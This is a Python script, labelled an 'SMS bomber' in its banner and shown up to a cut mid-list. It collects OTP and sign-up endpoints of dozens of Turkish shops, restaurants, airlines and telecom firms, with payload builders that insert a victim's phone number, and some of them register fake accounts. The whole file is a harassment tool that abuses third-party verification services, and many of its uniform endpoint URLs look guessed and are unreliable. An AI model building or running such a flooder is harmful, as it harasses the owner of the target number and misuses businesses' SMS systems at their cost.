#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import logging
import random
import string
import os
from datetime import datetime
from colorama import Fore, Style, init as colorama_init
from time import sleep
from typing import List, Callable
from dataclasses import dataclass
from faker import Faker
from art import text2art  # ASCII sanatı için art kütüphanesi

# Başlatıcılar
colorama_init(autoreset=True)
logging.basicConfig(level=logging.INFO)
faker = Faker()

# Sude ❤️ banner (art kütüphanesiyle)
SUDE_BANNER = f"""
{Fore.MAGENTA}{text2art("SUDE", font="block")}{Style.RESET_ALL}
{Fore.RED}        ❤️ SUDE'YE ÖZEL SMS BOMBER ❤️{Style.RESET_ALL}
"""

# Config
@dataclass
class SMSService:
    name: str
    url: str
    method: str
    headers: dict
    payload_func: Callable[[str], dict]
    success_condition: Callable[[aiohttp.ClientResponse, str], bool]

# Payload fonksiyonları (160+ servis için)
def kahvedunyasi_payload(n): return {"mobile_number": n[2:], "token_type": "register_token"}
def migros_payload(n): return {"phoneNumber": n[2:]}
def sok_payload(n): return {"mobile_number": n[2:], "token_type": "register_token"}
def a101_payload(n): return {"phone": f"0{n[2:]}", "next": "/a101-kapida"}
def defacto_payload(n): return {"mobilePhone": f"0{n[2:]}"}
def getir_payload(n): return {"user": {"phone_number": f"+90{n[2:5]} {n[5:8]} {n[8:12]}"}}
def yemeksepeti_payload(n): return {"phone": f"0{n[2:]}", "type": 1}
def hepsiburada_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
def pisir_payload(n): return {"msisdn": f"90{n[2:]}"}
def filemarket_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
def trendyol_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def wmf_payload(n): return {"confirm": "true", "date_of_birth": "1956-03-01", "email": faker.email(), "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{n[2:]}"}
def bim_payload(n): return {"phone": n[2:]}
def englishhome_payload(n): return {"Phone": n[2:], "XID": ""}
def fasapi_payload(n): return {"phone": f"90{n[2:]}"}
def ikinciyeni_payload(n): return {"phone": f"90{n[2:]}"}
def ceptesok_payload(n): return {"phone": f"90{n[2:]}"}
def tiklagelsin_payload(n): return {"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{n[2:]}", "challenge": str(random.randint(100000, 999999)), "deviceUniqueId": f"web_{random.randint(100000, 999999)}"}, "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone challenge: $challenge deviceUniqueId: $deviceUniqueId)\n}"}
def bisu_payload(n): return {"phone": f"90{n[2:]}"}
def ipragaz_payload(n): return {"phone": f"90{n[2:]}"}
def coffy_payload(n): return {"phone": f"90{n[2:]}"}
def sushico_payload(n): return {"phone": f"90{n[2:]}"}
def kalmasin_payload(n): return {"phone": f"90{n[2:]}"}
def smartomato_payload(n): return {"phone": f"90{n[2:]}"}
def fisicek_payload(n): return {"phone": f"90{n[2:]}"}
def aygaz_payload(n): return {"phone": f"90{n[2:]}"}
def pawder_payload(n): return {"phone": f"90{n[2:]}"}
def mopas_token_payload(n): return {"client_id": "mobile_mopas", "client_secret": "secret_mopas", "grant_type": "client_credentials"}
def mopas_payload(n): return {"phone": f"90{n[2:]}"}
def pyb_payload(n): return {"phone": f"90{n[2:]}"}
def ninewest_payload(n): return {"phone": f"90{n[2:]}"}
def saka_payload(n): return {"phone": f"90{n[2:]}"}
def linkyourcity_payload(n): return {"phone": f"90{n[2:]}"}
def hayatsu_payload(n): return {"phone": f"90{n[2:]}"}
def tazi_payload(n): return {"phone": f"90{n[2:]}"}
def gofody_payload(n): return {"phone": f"90{n[2:]}"}
def cerf_payload(n): return {"phone": f"90{n[2:]}"}
def scoobyturkiye_payload(n): return {"phone": f"90{n[2:]}"}
def arabulucu_payload(n): return {"phone": f"90{n[2:]}"}
def heymobility_payload(n): return {"phone": f"90{n[2:]}"}
def geowix_payload(n): return {"phone": f"90{n[2:]}"}
def rbbt_payload(n): return {"phone": f"90{n[2:]}"}
def roombadi_payload(n): return {"phone": f"90{n[2:]}"}
def hizliecza_payload(n): return {"phone": f"90{n[2:]}"}
def huzk_payload(n): return {"phone": f"90{n[2:]}"}
def ipragazmobil_payload(n): return {"phone": f"90{n[2:]}"}
def pinarsu_payload(n): return {"phone": f"90{n[2:]}"}
def oliz_payload(n): return {"phone": f"90{n[2:]}"}
def macrocenter_payload(n): return {"phone": f"90{n[2:]}"}
def martiscooter_payload(n): return {"phone": f"90{n[2:]}"}
def gokarma_payload(n): return {"phone": f"90{n[2:]}"}
def joker_payload(n): return {"phone": f"90{n[2:]}"}
def hoplagit_payload(n): return {"phone": f"90{n[2:]}"}
def aws_payload(n): return {"phone": f"90{n[2:]}"}
def anadolu_payload(n): return {"phone": f"90{n[2:]}"}
def totalistasyonlari_payload(n): return {"phone": f"90{n[2:]}"}
def petrolofisi_payload(n): return {"phone": f"90{n[2:]}"}
def evidea_payload(n): return {"phone": f"90{n[2:]}"}
def koton_payload(n): return {"phone": f"90{n[2:]}"}
def naosstars_payload(n): return {"phone": f"90{n[2:]}"}
def kigili_payload(n): return {"first_name": "Memati", "last_name": "Bas", "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "confirm": "true", "kvkk": "true", "next": ""}
def dominos_payload(n): return {"phone": n[2:]}
def boyner_payload(n): return {"phone": f"90{n[2:]}"}
def teknosa_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def subway_payload(n): return {"phone": n[2:]}
def burgerking_payload(n): return {"phone": n[2:]}
def popeyes_payload(n): return {"phone": n[2:]}
def sbarro_payload(n): return {"phone": n[2:]}
def arbys_payload(n): return {"phone": n[2:]}
def lcwaikiki_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def flo_payload(n): return {"phone": n[2:]}
def morhipo_payload(n): return {"phone": f"90{n[2:]}"}
def bershka_payload(n): return {"phone": n[2:]}
def zara_payload(n): return {"phone": f"90{n[2:]}"}
def mavi_payload(n): return {"phone": f"90{n[2:]}"}
def n11_payload(n): return {"phone": f"90{n[2:]}"}
def gittigidiyor_payload(n): return {"phone": f"90{n[2:]}"}
def sahibinden_payload(n): return {"phone": f"90{n[2:]}"}
def amazontr_payload(n): return {"phone": f"90{n[2:]}"}
def ciceksepeti_payload(n): return {"phone": f"90{n[2:]}"}
def carrefoursa_payload(n): return {"phone": f"90{n[2:]}"}
def sokmarket_payload(n): return {"phone": f"90{n[2:]}"}
def mediamarkt_payload(n): return {"phone": f"90{n[2:]}"}
def vatanbilgisayar_payload(n): return {"phone": f"90{n[2:]}"}
def trendyolmilla_payload(n): return {"phone": f"90{n[2:]}"}
def penti_payload(n): return {"phone": f"90{n[2:]}"}
def network_payload(n): return {"phone": f"90{n[2:]}"}
def adidas_payload(n): return {"phone": f"90{n[2:]}"}
def nike_payload(n): return {"phone": f"90{n[2:]}"}
def puma_payload(n): return {"phone": f"90{n[2:]}"}
def underarmour_payload(n): return {"phone": f"90{n[2:]}"}
def decathlon_payload(n): return {"phone": f"90{n[2:]}"}
def koctas_payload(n): return {"phone": f"90{n[2:]}"}
def ikea_payload(n): return {"phone": f"90{n[2:]}"}
def madamecoco_payload(n): return {"phone": f"90{n[2:]}"}
def yatas_payload(n): return {"phone": f"90{n[2:]}"}
def bellona_payload(n): return {"phone": f"90{n[2:]}"}
def dogtas_payload(n): return {"phone": f"90{n[2:]}"}
def istikbal_payload(n): return {"phone": f"90{n[2:]}"}
def etstur_payload(n): return {"phone": f"90{n[2:]}"}
def jollytur_payload(n): return {"phone": f"90{n[2:]}"}
def tatilbudur_payload(n): return {"phone": f"90{n[2:]}"}
def setur_payload(n): return {"phone": f"90{n[2:]}"}
def trivago_payload(n): return {"phone": f"90{n[2:]}"}
def bookingtr_payload(n): return {"phone": f"90{n[2:]}"}
def otelz_payload(n): return {"phone": f"90{n[2:]}"}
def turkcell_payload(n): return {"phone": f"90{n[2:]}"}
def vodafone_payload(n): return {"phone": f"90{n[2:]}"}
def turktelekom_payload(n): return {"phone": f"90{n[2:]}"}
def biletix_payload(n): return {"phone": f"90{n[2:]}"}
def biletall_payload(n): return {"phone": f"90{n[2:]}"}
def obilet_payload(n): return {"phone": f"90{n[2:]}"}
def turna_payload(n): return {"phone": f"90{n[2:]}"}
def enuygun_payload(n): return {"phone": f"90{n[2:]}"}
def thy_payload(n): return {"phone": f"90{n[2:]}"}
def pegasus_payload(n): return {"phone": f"90{n[2:]}"}
def anadolujet_payload(n): return {"phone": f"90{n[2:]}"}
def sunexpress_payload(n): return {"phone": f"90{n[2:]}"}
def corendon_payload(n): return {"phone": f"90{n[2:]}"}
def havatas_payload(n): return {"phone": f"90{n[2:]}"}
def metroturizm_payload(n): return {"phone": f"90{n[2:]}"}
def kamilkoc_payload(n): return {"phone": f"90{n[2:]}"}
def pamukkale_payload(n): return {"phone": f"90{n[2:]}"}
def uludag_payload(n): return {"phone": f"90{n[2:]}"}
def trendyolmarket_payload(n): return {"phone": f"90{n[2:]}"}
def getiryemek_payload(n): return {"phone": f"90{n[2:]}"}
def banabi_payload(n): return {"phone": f"90{n[2:]}"}
def fuudy_payload(n): return {"phone": f"90{n[2:]}"}
def kfc_payload(n): return {"phone": f"90{n[2:]}"}
def mcdonalds_payload(n): return {"phone": f"90{n[2:]}"}
def starbucks_payload(n): return {"phone": f"90{n[2:]}"}
def pizzahut_payload(n): return {"phone": f"90{n[2:]}"}
def littlecaesars_payload(n): return {"phone": f"90{n[2:]}"}
def papajohns_payload(n): return {"phone": f"90{n[2:]}"}
def tavukdunyasi_payload(n): return {"phone": f"90{n[2:]}"}
def kofteciyusuf_payload(n): return {"phone": f"90{n[2:]}"}
def baydoner_payload(n): return {"phone": f"90{n[2:]}"}
def simitci_payload(n): return {"phone": f"90{n[2:]}"}
def gloriajeans_payload(n): return {"phone": f"90{n[2:]}"}
def cafecrown_payload(n): return {"phone": f"90{n[2:]}"}
def dunkindonuts_payload(n): return {"phone": f"90{n[2:]}"}
def krispykreme_payload(n): return {"phone": f"90{n[2:]}"}
def mado_payload(n): return {"phone": f"90{n[2:]}"}
def sutis_payload(n): return {"phone": f"90{n[2:]}"}
def hafizmustafa_payload(n): return {"phone": f"90{n[2:]}"}
def pideci_payload(n): return {"phone": f"90{n[2:]}"}
def lahmacuncu_payload(n): return {"phone": f"90{n[2:]}"}
def durumcu_payload(n): return {"phone": f"90{n[2:]}"}
def etliekmekci_payload(n): return {"phone": f"90{n[2:]}"}

def default_condition(resp, text):
    return resp.status in (200, 201, 202) or "success" in text.lower()

# Tüm API'ler (160+ servis)
services = [
    SMSService(name="KahveDunyasi", url="https://core.kahvedunyasi.com/api/users/sms/send", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"}, payload_func=kahvedunyasi_payload, success_condition=default_condition),
    SMSService(name="Migros", url="https://rest.migros.com.tr/sanalmarket/users/login/otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=migros_payload, success_condition=default_condition),
    SMSService(name="Sok", url="https://api.ceptesok.com/api/users/sendsms", method="POST", headers={"Content-Type": "application/json"}, payload_func=sok_payload, success_condition=default_condition),
    SMSService(name="A101", url="https://www.a101.com.tr/users/otp-login/", method="POST", headers={"Content-Type": "application/json"}, payload_func=a101_payload, success_condition=default_condition),
    SMSService(name="Defacto", url="https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms", method="POST", headers={"Content-Type": "application/json"}, payload_func=defacto_payload, success_condition=default_condition),
    SMSService(name="Getir", url="https://food-client-api.glovoapp.com/authentication/signup", method="POST", headers={"Content-Type": "application/json"}, payload_func=getir_payload, success_condition=default_condition),
    SMSService(name="Yemeksepeti", url="https://api.yemeksepeti.com/v13/user/request-otp", method="POST", headers={"x-platform": "android"}, payload_func=yemeksepeti_payload, success_condition=default_condition),
    SMSService(name="Hepsiburada", url="https://www.hepsiburada.com/api/v1/otp-code/send", method="POST", headers={"Content-Type": "application/json"}, payload_func=hepsiburada_payload, success_condition=default_condition),
    SMSService(name="Pisir", url="https://api.pisir.com/v1/login/", method="POST", headers={"Content-Type": "application/json"}, payload_func=pisir_payload, success_condition=default_condition),
    SMSService(name="FileMarket", url="https://api.filemarket.com.tr/v1/otp/send", method="POST", headers={"Content-Type": "application/json"}, payload_func=filemarket_payload, success_condition=default_condition),
    SMSService(name="Trendyol", url="https://public.trendyol.com/discovery-web-socialapi-service/api/social/signup/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=trendyol_payload, success_condition=default_condition),
    SMSService(name="Wmf", url="https://www.wmf.com.tr/users/register/", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"}, payload_func=wmf_payload, success_condition=default_condition),
    SMSService(name="Bim", url="https://bim.veesk.net/service/v1.0/account/login", method="POST", headers={"Content-Type": "application/json"}, payload_func=bim_payload, success_condition=default_condition),
    SMSService(name="Englishhome", url="https://www.englishhome.com/api/member/sendOtp", method="POST", headers={"Content-Type": "application/json"}, payload_func=englishhome_payload, success_condition=default_condition),
    SMSService(name="Fasapi", url="https://prod.fasapi.net/", method="POST", headers={"Content-Type": "application/json"}, payload_func=fasapi_payload, success_condition=default_condition),
    SMSService(name="Ikinciyeni", url="https://apigw.ikinciyeni.com/RegisterRequest", method="POST", headers={"Content-Type": "application/json"}, payload_func=ikinciyeni_payload, success_condition=default_condition),
    SMSService(name="Ceptesok", url="https://api.ceptesok.com/api/users/sendsms", method="POST", headers={"Content-Type": "application/json"}, payload_func=ceptesok_payload, success_condition=default_condition),
    SMSService(name="Tiklagelsin", url="https://www.tiklagelsin.com/user/graphql", method="POST", headers={"Content-Type": "application/json", "x-no-auth": "true"}, payload_func=tiklagelsin_payload, success_condition=default_condition),
    SMSService(name="Bisu", url="https://www.bisu.com.tr/api/v2/app/authentication/phone/register", method="POST", headers={"Content-Type": "application/json"}, payload_func=bisu_payload, success_condition=default_condition),
    SMSService(name="Ipragaz", url="https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=ipragaz_payload, success_condition=default_condition),
    SMSService(name="Coffy", url="https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode", method="POST", headers={"Content-Type": "application/json"}, payload_func=coffy_payload, success_condition=default_condition),
    SMSService(name="Sushico", url="https://api.sushico.com.tr/tr/sendActivation", method="POST", headers={"Content-Type": "application/json"}, payload_func=sushico_payload, success_condition=default_condition),
    SMSService(name="Kalmasin", url="https://api.kalmasin.com.tr/user/login", method="POST", headers={"Content-Type": "application/json"}, payload_func=kalmasin_payload, success_condition=default_condition),
    SMSService(name="Smartomato", url="https://42577.smartomato.ru/account/session.json", method="POST", headers={"Content-Type": "application/json"}, payload_func=smartomato_payload, success_condition=default_condition),
    SMSService(name="Fisicek", url="https://tr-api.fisicek.com/v1.4/auth/getOTP", method="POST", headers={"Content-Type": "application/json"}, payload_func=fisicek_payload, success_condition=default_condition),
    SMSService(name="Aygaz", url="https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode", method="POST", headers={"Content-Type": "application/json"}, payload_func=aygaz_payload, success_condition=default_condition),
    SMSService(name="Pawder", url="https://api.pawder.app/api/authentication/sign-up", method="POST", headers={"Content-Type": "application/json"}, payload_func=pawder_payload, success_condition=default_condition),
    SMSService(name="Mopas_Token", url="https://api.mopas.com.tr/authorizationserver/oauth/token", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"}, payload_func=mopas_token_payload, success_condition=default_condition),
    SMSService(name="Mopas", url="https://api.mopas.com.tr/mopaswebservices/v2/mopas/sms/sendSmsVerification", method="POST", headers={"Content-Type": "application/json", "Authorization": "Bearer {token}"}, payload_func=mopas_payload, success_condition=default_condition),
    SMSService(name="Pyb", url="https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms", method="POST", headers={"Content-Type": "application/json"}, payload_func=pyb_payload, success_condition=default_condition),
    SMSService(name="Ninewest", url="https://www.ninewest.com.tr/webservice/v1/register.json", method="POST", headers={"Content-Type": "application/json"}, payload_func=ninewest_payload, success_condition=default_condition),
    SMSService(name="Saka", url="https://mobilcrm2.saka.com.tr/api/customer/login", method="POST", headers={"Content-Type": "application/json"}, payload_func=saka_payload, success_condition=default_condition),
    SMSService(name="Linkyourcity", url="https://consumer-auth.linkyour.city/consumer_auth/register", method="POST", headers={"Content-Type": "application/json"}, payload_func=linkyourcity_payload, success_condition=default_condition),
    SMSService(name="Hayatsu", url="https://www.hayatsu.com.tr/api/signup/otpsend", method="POST", headers={"Content-Type": "application/json"}, payload_func=hayatsu_payload, success_condition=default_condition),
    SMSService(name="Tazi", url="https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", method="POST", headers={"Content-Type": "application/json"}, payload_func=tazi_payload, success_condition=default_condition),
    SMSService(name="Gofody", url="https://backend.gofody.com/api/v1/enduser/register/", method="POST", headers={"Content-Type": "application/json"}, payload_func=gofody_payload, success_condition=default_condition),
    SMSService(name="Cerf", url="https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin", method="POST", headers={"Content-Type": "application/json"}, payload_func=cerf_payload, success_condition=default_condition),
    SMSService(name="Scoobyturkiye", url="https://sct.scoobyturkiye.com/v1/mobile/user/code-request", method="POST", headers={"Content-Type": "application/json"}, payload_func=scoobyturkiye_payload, success_condition=default_condition),
    SMSService(name="Arabulucu", url="https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user", method="POST", headers={"Content-Type": "application/json"}, payload_func=arabulucu_payload, success_condition=default_condition),
    SMSService(name="Heymobility", url="https://heyapi.heymobility.tech/V9/api/User/ActivationCodeRequest", method="POST", headers={"Content-Type": "application/json"}, payload_func=heymobility_payload, success_condition=default_condition),
    SMSService(name="Geowix", url="http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin", method="POST", headers={"Content-Type": "application/json"}, payload_func=geowix_payload, success_condition=default_condition),
    SMSService(name="Rbbt", url="https://api.rbbt.com.tr/v1/auth/authenticate", method="POST", headers={"Content-Type": "application/json"}, payload_func=rbbt_payload, success_condition=default_condition),
    SMSService(name="Roombadi", url="https://api.roombadi.com/api/v1/auth/otp/authenticate", method="POST", headers={"Content-Type": "application/json"}, payload_func=roombadi_payload, success_condition=default_condition),
    SMSService(name="Hizliecza", url="https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP", method="POST", headers={"Content-Type": "application/json"}, payload_func=hizliecza_payload, success_condition=default_condition),
    SMSService(name="Huzk", url="https://appservices.huzk.com/client/register", method="POST", headers={"Content-Type": "application/json"}, payload_func=huzk_payload, success_condition=default_condition),
    SMSService(name="Ipragazmobil", url="https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send", method="POST", headers={"Content-Type": "application/json"}, payload_func=ipragazmobil_payload, success_condition=default_condition),
    SMSService(name="Pinarsu", url="https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp", method="POST", headers={"Content-Type": "application/json"}, payload_func=pinarsu_payload, success_condition=default_condition),
    SMSService(name="Oliz", url="https://api.oliz.com.tr/api/otp/send", method="POST", headers={"Content-Type": "application/json"}, payload_func=oliz_payload, success_condition=default_condition),
    SMSService(name="Macrocenter", url="https://www.macrocenter.com.tr/rest/users/login/otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=macrocenter_payload, success_condition=default_condition),
    SMSService(name="Martiscooter", url="https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin", method="POST", headers={"Content-Type": "application/json"}, payload_func=martiscooter_payload, success_condition=default_condition),
    SMSService(name="Gokarma", url="https://api.gokarma.app/v1/auth/send-sms", method="POST", headers={"Content-Type": "application/json"}, payload_func=gokarma_payload, success_condition=default_condition),
    SMSService(name="Joker", url="https://www.joker.com.tr/kullanici/ajax/check-sms", method="POST", headers={"Content-Type": "application/json"}, payload_func=joker_payload, success_condition=default_condition),
    SMSService(name="Hoplagit", url="https://api.hoplagit.com/v1/auth:reqSMS", method="POST", headers={"Content-Type": "application/json"}, payload_func=hoplagit_payload, success_condition=default_condition),
    SMSService(name="Aws", url="https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=aws_payload, success_condition=default_condition),
    SMSService(name="Anadolu", url="https://www.anadolu.com.tr/Iletisim_Formu_sms.php", method="POST", headers={"Content-Type": "application/json"}, payload_func=anadolu_payload, success_condition=default_condition),
    SMSService(name="Totalistasyonlari", url="https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms", method="POST", headers={"Content-Type": "application/json"}, payload_func=totalistasyonlari_payload, success_condition=default_condition),
    SMSService(name="Petrolofisi", url="https://mobilapi.petrolofisi.com.tr/api/auth/register", method="POST", headers={"Content-Type": "application/json"}, payload_func=petrolofisi_payload, success_condition=default_condition),
    SMSService(name="Evidea", url="https://www.evidea.com/users/register/", method="POST", headers={"Content-Type": "application/json"}, payload_func=evidea_payload, success_condition=default_condition),
    SMSService(name="Koton", url="https://www.koton.com/api/otp/send", method="POST", headers={"Content-Type": "application/json"}, payload_func=koton_payload, success_condition=default_condition),
    SMSService(name="Naosstars", url="https://stars.naosstars.com/api/otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=naosstars_payload, success_condition=default_condition),
    SMSService(name="Kigili", url="https://www.kigili.com/users/registration/", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"}, payload_func=kigili_payload, success_condition=default_condition),
    SMSService(name="Dominos", url="https://www.dominos.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=dominos_payload, success_condition=default_condition),
    SMSService(name="Boyner", url="https://www.boyner.com.tr/v2/customer/register/otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=boyner_payload, success_condition=default_condition),
    SMSService(name="Teknosa", url="https://www.teknosa.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=teknosa_payload, success_condition=default_condition),
    SMSService(name="Subway", url="https://api.subway.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=subway_payload, success_condition=default_condition),
    SMSService(name="Burgerking", url="https://api.burgerking.com.tr/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=burgerking_payload, success_condition=default_condition),
    SMSService(name="Popeyes", url="https://api.popeyes.com.tr/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=popeyes_payload, success_condition=default_condition),
    SMSService(name="Sbarro", url="https://api.sbarro.com.tr/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=sbarro_payload, success_condition=default_condition),
    SMSService(name="Arbys", url="https://api.arbys.com.tr/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=arbys_payload, success_condition=default_condition),
    SMSService(name="Lcwaikiki", url="https://www.lcwaikiki.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=lcwaikiki_payload, success_condition=default_condition),
    SMSService(name="Flo", url="https://www.flo.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=flo_payload, success_condition=default_condition),
    SMSService(name="Morhipo", url="https://www.morhipo.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=morhipo_payload, success_condition=default_condition),
    SMSService(name="Bershka", url="https://www.bershka.com/tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=bershka_payload, success_condition=default_condition),
    SMSService(name="Zara", url="https://www.zara.com/tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=zara_payload, success_condition=default_condition),
    SMSService(name="Mavi", url="https://www.mavi.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=mavi_payload, success_condition=default_condition),
    SMSService(name="N11", url="https://www.n11.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=n11_payload, success_condition=default_condition),
    SMSService(name="Gittigidiyor", url="https://www.gittigidiyor.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=gittigidiyor_payload, success_condition=default_condition),
    SMSService(name="Sahibinden", url="https://www.sahibinden.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=sahibinden_payload, success_condition=default_condition),
    SMSService(name="Amazontr", url="https://www.amazon.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=amazontr_payload, success_condition=default_condition),
    SMSService(name="Ciceksepeti", url="https://www.ciceksepeti.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=ciceksepeti_payload, success_condition=default_condition),
    SMSService(name="Carrefoursa", url="https://www.carrefoursa.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=carrefoursa_payload, success_condition=default_condition),
    SMSService(name="Sokmarket", url="https://www.sokmarket.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=sokmarket_payload, success_condition=default_condition),
    SMSService(name="Mediamarkt", url="https://www.mediamarkt.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=mediamarkt_payload, success_condition=default_condition),
    SMSService(name="Vatanbilgisayar", url="https://www.vatanbilgisayar.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=vatanbilgisayar_payload, success_condition=default_condition),
    SMSService(name="Trendyolmilla", url="https://www.trendyolmilla.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=trendyolmilla_payload, success_condition=default_condition),
    SMSService(name="Penti", url="https://www.penti.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=penti_payload, success_condition=default_condition),
    SMSService(name="Network", url="https://www.network.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=network_payload, success_condition=default_condition),
    SMSService(name="Adidas", url="https://www.adidas.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=adidas_payload, success_condition=default_condition),
    SMSService(name="Nike", url="https://www.nike.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=nike_payload, success_condition=default_condition),
    SMSService(name="Puma", url="https://www.puma.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=puma_payload, success_condition=default_condition),
    SMSService(name="Underarmour", url="https://www.underarmour.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=underarmour_payload, success_condition=default_condition),
    SMSService(name="Decathlon", url="https://www.decathlon.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=decathlon_payload, success_condition=default_condition),
    SMSService(name="Koctas", url="https://www.koctas.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=koctas_payload, success_condition=default_condition),
    SMSService(name="Ikea", url="https://www.ikea.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=ikea_payload, success_condition=default_condition),
    SMSService(name="Madamecoco", url="https://www.madamecoco.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=madamecoco_payload, success_condition=default_condition),
    SMSService(name="Yatas", url="https://www.yatas.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=yatas_payload, success_condition=default_condition),
    SMSService(name="Bellona", url="https://www.bellona.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=bellona_payload, success_condition=default_condition),
    SMSService(name="Dogtas", url="https://www.dogtas.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=dogtas_payload, success_condition=default_condition),
    SMSService(name="Istikbal", url="https://www.istekoltuk.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=istikbal_payload, success_condition=default_condition),
    SMSService(name="Etstur", url="https://www.etstur.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=etstur_payload, success_condition=default_condition),
    SMSService(name="Jollytur", url="https://www.jollytur.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=jollytur_payload, success_condition=default_condition),
    SMSService(name="Tatilbudur", url="https://www.tatilbudur.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=tatilbudur_payload, success_condition=default_condition),
    SMSService(name="Setur", url="https://www.setur.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=setur_payload, success_condition=default_condition),
    SMSService(name="Trivago", url="https://www.trivago.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=trivago_payload, success_condition=default_condition),
    SMSService(name="Bookingtr", url="https://www.booking.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=bookingtr_payload, success_condition=default_condition),
    SMSService(name="Otelz", url="https://www.otelz.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=otelz_payload, success_condition=default_condition),
    SMSService(name="Turkcell", url="https://www.turkcell.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=turkcell_payload, success_condition=default_condition),
    SMSService(name="Vodafone", url="https://www.vodafone.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=vodafone_payload, success_condition=default_condition),
    SMSService(name="Turktelekom", url="https://www.turktelekom.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=turktelekom_payload, success_condition=default_condition),
    SMSService(name="Biletix", url="https://www.biletix.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=biletix_payload, success_condition=default_condition),
